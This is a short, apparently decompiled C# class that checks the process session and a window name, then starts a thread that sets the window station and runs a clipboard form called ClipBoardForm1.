using System;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;

namespace Session1.ClipBoard;

public class ClipBoardManagers
{
	public static void Run()
	{
		if (Process.GetCurrentProcess().SessionId != 0 && NtApi32.FindWindowA(null, "ClipBoardForm1") == IntPtr.Zero)
		{
			Thread thread = new Thread((ParameterizedThreadStart)delegate
			{
				WindowStation.SetWindowStation();
				Application.Run((Form)(object)new ClipBoardForm1());
			});
			thread.SetApartmentState(ApartmentState.MTA);
			thread.Start();
		}
	}
}
